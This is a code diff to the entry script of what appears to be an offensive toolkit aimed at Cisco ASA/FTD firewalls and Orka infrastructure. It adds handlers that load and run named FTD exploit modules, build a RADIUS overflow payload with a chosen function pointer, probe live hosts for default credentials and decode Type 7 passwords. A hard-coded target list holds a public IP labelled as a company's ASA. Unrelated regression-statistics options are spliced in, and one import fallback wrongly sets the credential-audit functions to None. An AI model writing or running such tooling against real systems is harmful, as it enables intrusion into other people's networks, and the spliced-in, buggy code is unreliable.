@@ -239,6 +239,36 @@ except ImportError:
     HAS_LINA_RE = False
     CiscoASALinaRE = None
 
+try:
+    from modules.cisco_asa_cred_audit import (
+        CiscoASAConfigAudit, CiscoASALiveCredCheck, cisco_type7_decode,
+    )
+    HAS_CRED_AUDIT = True
+except ImportError:
+    HAS_CRED_AUDIT = False
+    CiscoASAConfigAudit = None
+
+try:
+    from modules.cisco_ftd_re import CiscoFTDRE, generate_snort_fuzz_corpus
+    HAS_FTD_RE = True
+except ImportError:
+    HAS_FTD_RE = False
+    CiscoFTDRE = None
+
+try:
+    from modules.regression import (
+        Regression, LogisticRegression, DescriptiveStats, CorrelationMatrix,
+        FirmwareVersionRegression, SymbolicOffsetRegression, compare_models,
+        run_regression, run_demo as regression_demo,
+    )
+    HAS_REGRESSION = True
+except ImportError:
+    HAS_REGRESSION = False
+    Regression = None
+    LogisticRegression = None
+    CiscoASALiveCredCheck = None
+    cisco_type7_decode = None
+
 
 MACSTADIUM_ASAS = [
     {'host': '207.254.35.12', 'port': 443, 'label': 'ASA-Primary'},
@@ -963,10 +993,60 @@ def main():
     parser.add_argument('--orka-regcreds', action='store_true', help='Extract Docker registry credentials from Orka API')
     parser.add_argument('--orka-virsh-chain', metavar='POD', help='Run virsh probe chain against orka-vm container in POD')
     parser.add_argument('--orka-attack-chain', action='store_true', help='Full Orka attack chain: enum + exec + SA token + regcreds')
+    # cisco_ftd_re flags
+    parser.add_argument('--ftd-exploit', metavar='MODULE',
+        help='Run a specific FTD ablation exploit module (e.g. log4shell_fdm, neo4j_backup_exfil, devauth_hardcoded_creds). '
+             'Use --ftd-list to see all available modules.')
+    parser.add_argument('--ftd-exploit-args', nargs=argparse.REMAINDER, default=[],
+        help='Arguments to pass to the FTD exploit module (e.g. -- check)')
+    parser.add_argument('--ftd-list', action='store_true', help='List all available FTD exploit modules')
+    parser.add_argument('--ftd-re', action='store_true', help='Cisco FTD firmware RE: Snort/FMC/REST/lina attack surface')
+    parser.add_argument('--ftd-image', metavar='FILE', help='Path to FTD qcow2 image file')
+    parser.add_argument('--ftd-rootfs', metavar='DIR', help='Path to already-extracted FTD root filesystem')
+    parser.add_argument('--ftd-binary', metavar='FILE', help='Analyze a single FTD binary (snort, lina, sfmbservice, etc.)')
+    parser.add_argument('--ftd-fuzz', metavar='DIR', help='Generate Snort rule fuzzing corpus in DIR')
+    parser.add_argument('--ftd-fuzz-count', type=int, default=500, help='Number of fuzz rules to generate (default: 500)')
+
     # cisco_asa_lina_re flags
     parser.add_argument('--lina-re', action='store_true', help='Cisco ASA lina ARM64 binary RE: AAA/RADIUS/TACACS+ attack surface')
     parser.add_argument('--lina-binary', metavar='FILE', help='Path to extracted lina ELF for static analysis')
     parser.add_argument('--radius-decrypt', nargs=3, metavar=('CIPHER_HEX','AUTH_HEX','SECRET'), help='Decrypt RADIUS User-Password: cipher_hex auth_hex shared_secret')
+    parser.add_argument('--f2-payload', action='store_true', help='Build F2 exploit payload: crafted RADIUS Access-Accept OU= overflow for 9.22.x')
+    parser.add_argument('--f2-secret', metavar='SECRET', default='', help='RADIUS shared secret for F2 payload HMAC (leave empty for placeholder)')
+    parser.add_argument('--f2-fn-ptr', metavar='ADDR', default='0x102c700', help='Function pointer for CALL *rax target (default: mgd_timer_stop = safe crash test)')
+    parser.add_argument('--f2-struct-a', metavar='ADDR', default='0x05523f68', help='Address of fake struct A in target memory (BSS default assumes ASLR=off)')
+
+    # cisco_asa_cred_audit flags
+    parser.add_argument('--asa-audit', metavar='CONFIG_FILE',
+        help='Offline audit of a Cisco ASA running-config for weak/default secrets')
+    parser.add_argument('--asa-creds', metavar='HOST',
+        help='Live default credential probe against ASA management interface (authorized targets only)')
+    parser.add_argument('--type7-decode', metavar='HASH',
+        help='Decode a Cisco Type 7 obfuscated password string')
+    parser.add_argument('--regress', metavar='FILE',
+        help='Run OLS regression analysis (CSV or Excel). Use with --regress-y, --regress-x')
+    parser.add_argument('--regress-demo', action='store_true',
+        help='Run regression demo with built-in advertising→sales dataset')
+    parser.add_argument('--regress-y', metavar='COL',
+        help='Dependent variable column name for --regress')
+    parser.add_argument('--regress-x', nargs='+', metavar='COL',
+        help='Independent variable column names (default: all except --regress-y)')
+    parser.add_argument('--regress-logistic', action='store_true',
+        help='Use logistic regression (binary Y) instead of OLS')
+    parser.add_argument('--regress-residuals', action='store_true',
+        help='Include residual output table in regression report')
+    parser.add_argument('--regress-descriptive', action='store_true',
+        help='Include descriptive statistics for all columns')
+    parser.add_argument('--regress-correlation', action='store_true',
+        help='Include Pearson correlation matrix')
+    parser.add_argument('--regress-confidence', type=float, default=0.95,
+        help='Confidence interval level (default: 0.95)')
+    parser.add_argument('--regress-output', metavar='FILE',
+        help='Write regression report to file (default: stdout)')
+    parser.add_argument('--regress-firmware', action='store_true',
+        help='Run firmware version struct-offset regression using confirmed LINA offsets')
+    parser.add_argument('--regress-symbolic', action='store_true',
+        help='Show PySR/REMaQE symbolic regression status and data collection progress')
 
     args = parser.parse_args()
     
@@ -1336,8 +1416,9 @@ def main():
                 coa_pkt = injector.build_disconnect_request(
                     nas_ip=t['host'], session_id='0'
                 )
-                result['coa_pkt_hex']  = coa_pkt.hex()
-                result['coa_pkt_len']  = len(coa_pkt)
+                result['coa_pkt_hex']  = coa_pkt.get('packet_hex', '')
+                result['coa_pkt_len']  = coa_pkt.get('length', 0)
+                result['coa_pkt_detail'] = coa_pkt
                 result['inject_vector'] = {
                     'attr': 25,
                     'format': CLASS_ATTR_FORMAT,
@@ -1528,6 +1609,112 @@ def main():
             result = run_full_attack_chain()
             print(json.dumps(result, indent=2, default=str))
 
+    elif getattr(args, 'f2_payload', False):
+        ablation.banner()
+        if not HAS_LINA_RE:
+            print("[-] cisco_asa_lina_re module not available")
+        else:
+            from modules.cisco_asa_lina_re import build_f2_payload
+            secret = (args.f2_secret or '').encode()
+            fn_ptr = int(args.f2_fn_ptr, 16)
+            addr_a = int(args.f2_struct_a, 16)
+            # struct B placed 0x40 bytes after struct A in same allocation
+            addr_b = addr_a + 0x40
+            result = build_f2_payload(
+                radius_id=1,
+                radius_secret=secret,
+                fn_ptr=fn_ptr,
+                struct_a_addr=addr_a,
+                struct_b_addr=addr_b,
+            )
+            print(json.dumps(result, indent=2))
+
+    elif getattr(args, 'ftd_list', False):
+        import glob
+        modules_dir = os.path.join(os.path.dirname(__file__), 'modules')
+        ftd_mods = sorted(glob.glob(os.path.join(modules_dir, 'ftd_*.py')))
+        print(f"[*] FTD ablation modules ({len(ftd_mods)} total):")
+        for path in ftd_mods:
+            name = os.path.basename(path).replace('.py', '').replace('ftd_', '')
+            # Extract first non-blank line of docstring as description
+            with open(path) as fh:
+                doc_line = ''
+                content = fh.read()
+            # Extract first F-FTD-xx line from docstring as description
+            import re as _re
+            m = _re.search(r'(F-FTD-\d+[^:\n]*:[^\n]{5,})', content)
+            if m:
+                doc_line = m.group(1).strip()[:80]
+            else:
+                for line in content.split('\n'):
+                    line = line.strip().strip('"\'').strip()
+                    if line and not line.startswith('#') and 'CONTROLLED' not in line:
+                        doc_line = line[:80]
+                        break
+            print(f"  {name:<35} {doc_line}")
+        print(f"\nUsage: python3 main.py --ftd-exploit <name> [-- <module-args>]")
+        print(f"Example: python3 main.py --ftd-exploit neo4j_backup_exfil -- check")
+
+    elif getattr(args, 'ftd_exploit', None):
+        import importlib.util
+        import sys as _sys
+        modules_dir = os.path.join(os.path.dirname(__file__), 'modules')
+        mod_name = args.ftd_exploit
+        if not mod_name.startswith('ftd_'):
+            mod_name = 'ftd_' + mod_name
+        mod_path = os.path.join(modules_dir, mod_name + '.py')
+        if not os.path.exists(mod_path):
+            print(f"[-] Module not found: {mod_path}")
+            print(f"    Use --ftd-list to see available modules")
+        else:
+            ablation.banner()
+            print(f"[*] Running FTD exploit module: {mod_name}")
+            print(f"    Path: {mod_path}")
+            print(f"    CONTROLLED ENVIRONMENT ONLY\n")
+            spec = importlib.util.spec_from_file_location(mod_name, mod_path)
+            mod = importlib.util.module_from_spec(spec)
+            # Override sys.argv so the module's argparse/main sees the right args
+            extra = getattr(args, 'ftd_exploit_args', [])
+            if extra and extra[0] == '--':
+                extra = extra[1:]
+            _sys.argv = [mod_path] + extra
+            spec.loader.exec_module(mod)
+
+    elif getattr(args, 'ftd_fuzz', None):
+        ablation.banner()
+        if not HAS_FTD_RE:
+            print("[-] cisco_ftd_re module not available")
+        else:
+            out_dir = args.ftd_fuzz
+            count = getattr(args, 'ftd_fuzz_count', 500)
+            print(f"[*] Generating {count} Snort rule fuzz cases -> {out_dir}")
+            files = generate_snort_fuzz_corpus(out_dir, count)
+            print(f"[+] Generated {len(files)} rule files in {out_dir}")
+            print(f"[+] Run: snort -c <conf> -R {out_dir}/*.rules --daq-var buffer_size_bytes=65535")
+
+    elif getattr(args, 'ftd_re', False) or getattr(args, 'ftd_image', None) or \
+            getattr(args, 'ftd_rootfs', None) or getattr(args, 'ftd_binary', None):
+        ablation.banner()
+        if not HAS_FTD_RE:
+            print("[-] cisco_ftd_re module not available")
+        else:
+            image = getattr(args, 'ftd_image', None)
+            rootfs = getattr(args, 'ftd_rootfs', None)
+            binary = getattr(args, 'ftd_binary', None)
+            print(f"[*] Cisco FTD RE — "
+                  f"{'image: ' + image if image else ''}"
+                  f"{'rootfs: ' + rootfs if rootfs else ''}"
+                  f"{'binary: ' + binary if binary else ''}")
+            re_engine = CiscoFTDRE(image_path=image, rootfs_path=rootfs, binary_path=binary)
+            findings = re_engine.run()
+            for f in findings:
+                print(f"\n[{f['severity']}] {f['id']}: {f['title']}")
+                print(f"  {f['detail'][:200]}")
+                if f.get('evidence'):
+                    for k, v in list(f['evidence'].items())[:3]:
+                        vstr = str(v)[:120]
+                        print(f"  {k}: {vstr}")
+
     elif getattr(args, 'lina_re', False) or getattr(args, 'lina_binary', None) or getattr(args, 'radius_decrypt', None):
         ablation.banner()
         if not HAS_LINA_RE:
@@ -1551,6 +1738,105 @@ def main():
                 if f.get('evidence'):
                     for k, v in list(f['evidence'].items())[:3]:
                         print(f"  {k}: {str(v)[:100]}")
+
+    elif getattr(args, 'type7_decode', None):
+        ablation.banner()
+        if not HAS_CRED_AUDIT:
+            print("[-] cisco_asa_cred_audit module not available")
+        else:
+            decoded = cisco_type7_decode(args.type7_decode)
+            print(f"[+] Type 7 decode: {args.type7_decode} -> \"{decoded}\"")
+
+    elif getattr(args, 'asa_audit', None):
+        ablation.banner()
+        if not HAS_CRED_AUDIT:
+            print("[-] cisco_asa_cred_audit module not available")
+        else:
+            cfg_path = args.asa_audit
+            print(f"[*] Cisco ASA config audit: {cfg_path}")
+            try:
+                with open(cfg_path) as fh:
+                    config_text = fh.read()
+            except Exception as e:
+                print(f"[-] Cannot read config file: {e}")
+            else:
+                findings = CiscoASAConfigAudit(config_text).run()
+                if not findings:
+                    print("[+] No weak/default secrets found.")
+                for f in findings:
+                    print(f"\n[{f['severity']}] {f['id']}: {f['title']}")
+                    print(f"  {f['detail'][:200]}")
+                    if f.get('evidence'):
+                        for k, v in list(f['evidence'].items())[:4]:
+                            print(f"  {k}: {str(v)[:100]}")
+
+    elif getattr(args, 'asa_creds', None):
+        ablation.banner()
+        if not HAS_CRED_AUDIT:
+            print("[-] cisco_asa_cred_audit module not available")
+        else:
+            host = args.asa_creds
+            print(f"[*] Cisco ASA live credential probe: {host} (authorized targets only)")
+            findings = CiscoASALiveCredCheck(host).run()
+            if not findings:
+                print("[+] No default credentials found.")
+            for f in findings:
+                print(f"\n[{f['severity']}] {f['id']}: {f['title']}")
+                print(f"  {f['detail'][:200]}")
+                if f.get('evidence'):
+                    for k, v in list(f['evidence'].items())[:4]:
+                        print(f"  {k}: {str(v)[:100]}")
+
+    elif getattr(args, 'regress_symbolic', False):
+        if not HAS_REGRESSION:
+            print("[-] regression module not available")
+        else:
+            sor = SymbolicOffsetRegression()
+            print(sor.status())
+
+    elif getattr(args, 'regress_firmware', False):
+        if not HAS_REGRESSION:
+            print("[-] regression module not available (pip install statsmodels pandas scipy)")
+        else:
+            print("=" * 72)
+            print("LINA gp_obj Struct Offset Regression — Cross-Version Tracking")
+            print("=" * 72)
+            print()
+            for field in ('gp_name', 'dns_ptr', 'wins_ptr'):
+                fvr = FirmwareVersionRegression.from_known_offsets(field)
+                print(fvr.report())
+                print()
+
+    elif getattr(args, 'regress_demo', False):
+        if not HAS_REGRESSION:
+            print("[-] regression module not available (pip install statsmodels pandas scipy)")
+        else:
+            report = regression_demo()
+            print(report)
+
+    elif getattr(args, 'regress', None):
+        if not HAS_REGRESSION:
+            print("[-] regression module not available (pip install statsmodels pandas scipy)")
+        else:
+            if not args.regress_y:
+                print("[-] --regress-y required: specify dependent variable column name")
+            else:
+                report = run_regression(
+                    path=args.regress,
+                    y_col=args.regress_y,
+                    x_cols=args.regress_x,
+                    logistic=args.regress_logistic,
+                    residuals=args.regress_residuals,
+                    descriptive=args.regress_descriptive,
+                    correlation=args.regress_correlation,
+                    no_constant=False,
+                    confidence=args.regress_confidence,
+                )
+                if getattr(args, 'regress_output', None):
+                    Path(args.regress_output).write_text(report)
+                    print(f"[+] Report written to {args.regress_output}")
+                else:
+                    print(report)
 
     elif args.containers:
         ablation.banner()
